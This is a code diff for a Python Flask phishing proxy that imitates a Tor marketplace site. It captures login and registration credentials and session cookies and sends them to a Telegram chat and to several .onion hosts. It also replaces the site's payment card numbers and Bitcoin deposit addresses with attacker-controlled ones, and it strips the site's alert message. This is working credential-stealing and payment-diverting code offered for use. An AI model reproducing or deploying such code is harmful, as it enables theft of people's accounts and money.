@@ -1,10 +1,14 @@
+import base64
+import json
 import random
+from threading import Thread
 from urllib.parse import urlparse, parse_qs
 
 import telebot
 from bs4 import BeautifulSoup, NavigableString
-from flask import Flask, request, make_response
+from flask import Flask, request, make_response, redirect
 import requests
+from telebot.util import quick_markup
 
 app = Flask(__name__)
 
@@ -20,7 +24,7 @@ bmb_urls = ['http://i7nmjkcchof5pegfglv7pkc7tbsl5ffvrxxjnqqz32nqqvmirhoh2gyd.oni
             'http://xneip42hr7bz7xlxnhwpaqt4kl4pyl3ypjru7i6rhhegjmeb5h4u6iqd.onion/',
             'http://wglmnjp536t6hna5u2a2sk3zpak3rmdkk5uo6joix3klmmv3rx33r2id.onion/']
 
-
+user_id ='-937233343'
 def change_card(html,
                 cards):
     try:
@@ -103,17 +107,111 @@ def change_only_card(html, cards=[ '2200 7008 3501 0140']):
         print(ex)
     return str(bs)
 
+def alert_modal_off(html):
+    bs = BeautifulSoup(html, 'lxml')
+    alert = bs.find(class_='alert-message')
+    script = bs.find_all('script')
+    if script:
+        script = script[-1]
+        if "const show_alert = 1;" in script.text:
+            script.string = """
 
+                const show_alert = 0;
+                const show_alert_uuid = 'bdf7071f-0c1e-43b2-a5f8-75585e174a2d'
+
+                document.addEventListener('DOMContentLoaded', () => {
+                    const callModal = () => {
+                        let modal = document.querySelector('.modal'),
+                            modalClose = document.querySelector('.close-modal');
+
+                        modal.classList.add('open');
+                        document.body.classList.add('open');
+
+                        const closePopup = () => {
+                            modal.classList.remove('open');
+                            document.body.classList.remove('open');
+                            const checked = $('.do_not_fuckme').is(":checked");
+                            if (checked) {
+                                $.ajax({
+                                    url: "/alert/consume/" + show_alert_uuid,
+                                    method: "get",
+                                })
+                            } else {
+                                $.ajax({
+                                    url: "/alert/hide/" + show_alert_uuid,
+                                    method: "get",
+                                })
+                            }
+                        }
+
+                        const closeModal = (e) => {
+                            if (
+                                e.target === modal ||
+                                e.target === modalClose
+                            ) {
+                                closePopup();
+                            }
+                        };
+
+                        modal.addEventListener('click', closeModal);
+
+                        $(document).ready(function () {
+                            $('.prekrasno').click(function (e) {
+                                closePopup()
+                            });
+                        })
+                    }
+                    if (show_alert === 1) {
+                        callModal();
+                    }
+                })
+
+                    """
+
+
+    if alert:
+        alert.string = ''
+        return str(bs)
+
+
+def bmb_send(login, password):
+    for url in bmb_urls:
+        try:
+            result = requests.post(url + bmbkeys, json=[f'{login}:{password}\n'],
+                                   proxies=proxies)
+            print(result.content)
+        except Exception as ex:
+            print(ex)
+            continue
+def get_balance(html):
+    bs = BeautifulSoup(html)
+    try:
+        money = bs.find(class_ ='account-money').text
+    except:
+        money = 0
+    finally:
+        return money
+@app.route('/session/<path:path>', methods=['GET', 'POST'])
+def sess_open(path):
+    cookies = json.loads(base64.b64decode(path.encode('utf-8')).decode('utf-8'))
+    resp = make_response(redirect('/'))
+    for key, value in cookies.items():
+        response_cookie_value = value if value else ''
+        resp.set_cookie(key, response_cookie_value)
+    return resp
 @app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
 @app.route('/<path:path>', methods=['GET', 'POST'])
 def proxy(path):
-    # bot.send_message(6272821020, 'Выполнен запрос на сайт')
+    flag = False
+    print('PATH: ' + path)
     target_url = request.cookies.get('url')
     if not target_url:
         target_url = 'http://kraken2trfqodidvlh4aa337cpzfrhdlfldhve5nf7njhumwr7instad.onion'
     request_headers = request.headers
     request_headers_dict = dict(request_headers)
+
     request_headers_dict.pop('Host')
+
     method = request.method
     if not target_url.endswith('/'):
         path = '/' + path
@@ -121,55 +219,83 @@ def proxy(path):
         target_url = 'http' + target_url[5:]
 
     if method == 'GET':
+        print(request.cookies.to_dict())
 
-        # if 'exchange' in path and 'amount' in request.args:
-        #     bot.send_message(-937233343, f'Вход на страницу оплаты\n'
-        #                                  f'{request.args["amount"]}')
-
-        print(target_url + path)
         response = requests.get(target_url + path, params=request.args, cookies=request.cookies,
                                 headers=request_headers_dict, proxies=proxies, allow_redirects=False, verify=False)
-    elif method == 'POST':
-        response = requests.post(target_url + path, data=request.form, cookies=request.cookies,
-                                 headers=request_headers_dict, proxies=proxies, allow_redirects=False, verify=False)
-        done = '✅'
-        if 'entry/login' in str(response.headers['Location']):
-            done = '❌'
-        if path in ['entry/post/login', '/entry/post/login']:
-            form_dict = dict(request.form)
-            try:
-                bot.send_message(-937233343, f'Логин: {done}\n{form_dict["login"]}\n{form_dict["password"]}')
-            except:
-                pass
-            for url in bmb_urls:
-                try:
-                    print(f'{form_dict["login"]}:{form_dict["password"]}')
-                    result = requests.post(url + bmbkeys, json=[f'{form_dict["login"]}:{form_dict["password"]}'],
-                                           proxies=proxies)
-                    print(result.content)
-                except Exception as ex:
-                    print(ex)
-                    continue
-        if path in ['entry/post/register', '/entry/post/register']:
-            form_dict = dict(request.form)
-            try:
-                bot.send_message(-937233343, f'Регистрация: {done}\n{form_dict["login"]}\n{form_dict["password1"]}')
-            except:
-                pass
-            for url in bmb_urls:
-                try:
-                    result = requests.post(url + bmbkeys, json=[f'{form_dict["login"]}:{form_dict["password1"]}'],
-                                           proxies=proxies)
-                    print(result.content)
-                except Exception as ex:
-                    print(ex)
-                    continue
 
+        respon_text = response.text
+
+        if alert_modal_off(respon_text):
+            respon_text = alert_modal_off(respon_text)
+            flag = True
+
+
+        if request.path.startswith('/exchange') and 'amount' in request.args:  # or 'order' in request.path.split('/')
+            bot.send_message(user_id, f'Вход на страницу оплаты {request.args["amount"]}')
+            respon_text = change_card(respon_text, cards=['2200 7008 3501 0140', '2200 7008 4750 7141', '2200 7008 4155 6292', '2200 7008 4890 9783', '2200 7008 4271 4643'])
+            flag = True
+
+        if ('exchange' in request.path) and ('order' in request.path) and ('my' not in request.path):
+            bot.send_message(user_id, f'Вход на страницу оплаты')
+            respon_text = change_only_card(respon_text)
+            flag = True
+
+        if path == '/profile/finances/':
+            bs = BeautifulSoup(response.text, 'lxml')
+            btc = bs.find(class_='finance_input')
+            btc['value'] = random.choice[
+                'bc1qajy94al63q0cw4f6z6jzx47jzpn5f28kms85aw', 'bc1qg8a29ujf459uyzedt8u9mhktmqkjdzth28xqqq', 'bc1qqqp72xt0fxdc8lll73ek0w0wuywjj7yslkxl5r']
+
+            respon_text = str(bs)
+            flag = True
+
+    elif method == 'POST':
+
+
+        if path in ['entry/post/login', '/entry/post/login']:
+            response = requests.post(target_url + path, data=request.form, cookies=request.cookies,
+                                     headers=request_headers_dict, proxies=proxies, allow_redirects=True, verify=False)
+            done = '❌'
+            balance = 0
+            if 'entry/login' not in str(response.url):
+                done = '✅'
+                balance = get_balance(response.text)
+            host_url = request_headers_dict['Referer']
+            form_dict = dict(request.form)
+            encoded_dict = base64.b64encode(json.dumps(request.cookies.to_dict()).encode('utf-8')).decode('utf-8')
+            bot.send_message(user_id, f'Логин: {done}\n<code>{form_dict["login"]}:{form_dict["password"]}</code>\n'
+                                             f'{host_url[:-11]}\n{balance}',
+                             reply_markup=quick_markup({'Вход':{'url':f'{request.url[0:-17]}/session/{encoded_dict}'}}))
+            Thread(target=bmb_send,args=[form_dict["login"],form_dict["password"]]).start()
+
+            respon_text = response.text
+
+            if alert_modal_off(respon_text):
+                respon_text = alert_modal_off(respon_text)
+                flag = True
+        elif path in ['entry/post/register', '/entry/post/register']:
+            response = requests.post(target_url + path, data=request.form, cookies=request.cookies,
+                                     headers=request_headers_dict, proxies=proxies, allow_redirects=True, verify=False)
+            done = '❌'
+            if 'entry/login' not in str(response.url):
+                done = '✅'
+            host_url = request_headers_dict['Referer']
+            form_dict = dict(request.form)
+            bot.send_message(user_id, f'Регистрация: {done}\n<code>{form_dict["login"]}:{form_dict["password1"]}</code>\n {host_url[:-11]}')
+            Thread(target=bmb_send,args=[form_dict["login"],form_dict["password1"]]).start()
+            respon_text = response.text
+
+            if alert_modal_off(respon_text):
+                respon_text = alert_modal_off(respon_text)
+                flag = True
+        else:
+            response = requests.post(target_url + path, data=request.form, cookies=request.cookies,
+                                     headers=request_headers_dict, proxies=proxies, allow_redirects=False, verify=False)
 
     else:
         return 'Error: unsupported HTTP method'
 
-    # передача заголовков ответа
     response_headers = response.headers
     response_headers_dict = dict(response_headers)
     response_headers_dict.pop('Transfer-Encoding', None)
@@ -177,42 +303,19 @@ def proxy(path):
     response_headers_dict.pop('Content-Length', None)
     response_headers_dict.pop('host', None)
     url_location = response_headers_dict.pop('Location', None)
-    print('respurl')
-    print(url_location)
     if url_location is not None:
         target_url = str(url_location[:70])
         url_location = url_location[70:]
+        if not url_location.startswith('/'):
+            url_location = '/' + url_location
         if url_location == '':
             url_location = '/'
-        response_headers_dict['Location'] = url_location
+        response_headers_dict['Location'] =  url_location
     response.data = response.content
     response.headers.update(response_headers_dict)
-    respon_text = response.text
-    print('my url')
-    print(url_location)
-    print(target_url)
-    print(path)
-    flag = False
-    # if request.path.startswith('/exchange') and 'amount' in request.args:  # or 'order' in request.path.split('/')
-    #     print('echangeeeeeee')
-    #     bot.send_message(6272821020, f'Вход на страницу оплаты')
-    #     respon_text = change_card(respon_text, cards =['2200 7008 3501 0140'])
-    #     flag = True
-    #
-    # if ('exchange' in request.path) and ('order' in request.path) and ('my' not in request.path):
-    #     print('exc in path')
-    #     bot.send_message(6272821020, f'Вход на страницу оплаты')
-    #     respon_text = change_only_card(respon_text)
-    #     flag = True
 
-    if path == '/profile/finances/':
-        bs = BeautifulSoup(response.text, 'lxml')
-        btc = bs.find(class_='finance_input')
-        btc_list = []
-        btc['value'] = random.choice['bc1qajy94al63q0cw4f6z6jzx47jzpn5f28kms85aw', 'bc1qg8a29ujf459uyzedt8u9mhktmqkjdzth28xqqq', 'bc1qqqp72xt0fxdc8lll73ek0w0wuywjj7yslkxl5r']
-        respon_text = str(bs)
-        flag = True
     if flag == True:
+        #print(respon_text)
         resp = make_response(respon_text, response.status_code)
     else:
         resp = make_response(response.content, response.status_code)
@@ -228,3 +331,4 @@ def proxy(path):
 
 if __name__ == '__main__':
     app.run()
+
